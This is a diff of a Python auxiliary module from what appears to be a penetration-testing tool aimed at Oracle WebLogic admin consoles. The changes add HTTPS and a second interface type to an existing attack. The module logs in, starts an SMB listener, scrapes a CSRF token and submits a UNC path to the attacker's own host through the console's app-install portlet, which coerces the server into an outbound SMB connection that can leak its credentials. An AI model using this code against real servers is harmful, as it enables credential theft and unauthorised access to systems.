@@ -6,6 +6,7 @@ from threading import Thread
 from log import LOG
 from re import findall
 from time import sleep
+from os import getuid
 import socket
 import utility
 import state
@@ -21,7 +22,7 @@ class Auxiliary:
         self._Listen = False
 
     def check(self, fingerprint):
-        if fingerprint.title in [WINTERFACES.WLA]:
+        if fingerprint.title in [WINTERFACES.WLA, WINTERFACES.WLS]:
             return True
         return False
 
@@ -36,29 +37,32 @@ class Auxiliary:
         base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
         uri = '/console/console.portal?AppApplicationInstallPortlet_actionOverride'\
               '=/com/bea/console/actions/app/install/appSelected'
-        data = { "AppApplicationInstallPortletselectedAppPath" : 
+        data = { "AppApplicationInstallPortletselectedAppPath" :
                  "\\\\{0}\\fdas.war".format(utility.local_address()),
-                 "AppApplicationInstallPortletfrsc" : None 
+                 "AppApplicationInstallPortletfrsc" : None
                 }
 
-        utility.Msg("Host %s:%s requires auth, checking.." % 
+        if fingerprint.title is WINTERFACES.WLS:
+            base = base.replace("http", "https")
+
+        utility.Msg("Host %s:%s requires auth, checking.." %
                         (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
-        cookies = checkAuth(fingerengine.options.ip, fingerprint, True)
-        
+        cookies = checkAuth(fingerengine.options.ip, fingerprint)
+
         if cookies[0]:
 
             utility.Msg("Setting up SMB listener...")
             self._Listen = True
             thread = Thread(target=self.smb_listener)
             thread.start()
-            
+
             # fetch our CSRF
             data['AppApplicationInstallPortletfrsc'] = self.fetchCSRF(base, cookies[0])
 
             utility.Msg("Invoking UNC loader...")
 
             try:
-                response = utility.requests_post(base+uri, data=data, cookies=cookies[0],
+                _ = utility.requests_post(base+uri, data=data, cookies=cookies[0],
                                 timeout=1.0)
             except:
                 # we dont care about the response here
@@ -70,7 +74,7 @@ class Auxiliary:
 
         while thread.is_alive():
             # spin
-            sleep(1) 
+            sleep(1)
 
         self._Listen = False
 
@@ -82,8 +86,8 @@ class Auxiliary:
 
         response = utility.requests_get(base+uri, cookies=cookie)
         if response.status_code == 200:
-            
-            data = findall('AppApplicationInstallPortletfrsc" value="(.*?)"', 
+
+            data = findall('AppApplicationInstallPortletfrsc" value="(.*?)"',
                             response.content)
             if len(data) > 0:
                 return data[0]
